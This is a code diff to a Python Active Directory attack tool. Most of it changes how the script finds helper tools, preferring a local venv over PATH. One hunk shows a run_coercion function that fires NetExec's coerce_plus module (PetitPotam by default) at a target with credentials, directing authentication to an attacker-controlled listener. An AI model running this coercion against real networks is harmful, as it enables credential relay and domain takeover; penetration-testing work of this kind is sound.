@@ -111,14 +111,39 @@ def check_port(host, port, timeout=3):
         return False
 
 def check_tool(name):
-    """Check for a tool on PATH, common user-local dirs, and venv dirs.
-    Handles sudo dropping ~/.local/bin from PATH automatically."""
-    path = shutil.which(name)
+    """Check for a tool in the script's venv first, then PATH, then common
+    user-local dirs.  Preferring the venv ensures the tool uses the clean
+    impacket/nxc installed by setup.sh rather than any system-wide fork.
+    Portable: only checks ./venv/ relative to the script — if there's no
+    venv (different setup, different network), falls through to PATH."""
+    path = None
+    # 1) Prefer the venv that setup.sh creates next to this script
+    script_dir = Path(__file__).parent.absolute()
+    venv_dirs = []
+    if IS_WINDOWS:
+        venv_dirs.append(str(script_dir / "venv" / "Scripts"))
+    else:
+        venv_dirs.append(str(script_dir / "venv" / "bin"))
+    for d in venv_dirs:
+        if IS_WINDOWS:
+            for suffix in ["", ".exe", ".cmd", ".bat"]:
+                candidate = os.path.join(d, f"{name}{suffix}")
+                if os.path.isfile(candidate):
+                    path = candidate
+                    break
+        else:
+            candidate = os.path.join(d, name)
+            if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
+                path = candidate
+        if path:
+            break
+    # 2) Fall back to system PATH
     if not path:
-        # When running under sudo, PATH is reset and user-local dirs are lost.
-        # Check common locations so 'sudo python3 tool.py' works without PATH hacks.
+        path = shutil.which(name)
+    # 3) When running under sudo, PATH is reset and user-local dirs are lost.
+    #    Check common locations so 'sudo python3 tool.py' works without PATH hacks.
+    if not path:
         fallback_dirs = []
-        # Check the invoking user's home (SUDO_USER is set by sudo)
         sudo_user = os.environ.get("SUDO_USER")
         if sudo_user:
             try:
@@ -127,14 +152,8 @@ def check_tool(name):
                 fallback_dirs.append(os.path.join(home, ".local", "bin"))
             except (KeyError, ImportError):
                 pass
-        # Also check the current user's home
         home_dir = os.path.expanduser("~")
         fallback_dirs.append(os.path.join(home_dir, ".local", "bin"))
-        # Check venv bin dirs
-        script_dir = Path(__file__).parent.absolute()
-        fallback_dirs.append(str(script_dir / "venv" / "bin"))
-        if IS_WINDOWS:
-            fallback_dirs.append(str(script_dir / "venv" / "Scripts"))
         for d in fallback_dirs:
             if IS_WINDOWS:
                 for suffix in ["", ".exe", ".cmd", ".bat"]:
@@ -971,7 +990,7 @@ def run_coercion(target_ip, domain, user, password, method="PetitPotam"):
         "-M", "coerce_plus",
         "-o", f"M={method}", f"LISTENER={STATIC_DNS_RECORD}"
     ]
-    log("RPC", ">>", f"cmd: nxc smb {target_ip} -d {domain} -u {user} -M coerce_plus -o M={method} L=...")
+    log("RPC", ">>", f"cmd: nxc smb {target_ip} -d {domain} -u {user} -M coerce_plus -o M={method} LISTENER=...")
 
     log("RPC", ">>", f"{C.BOLD}Firing coercion now...{C.RST}")
     proc = subprocess.Popen(
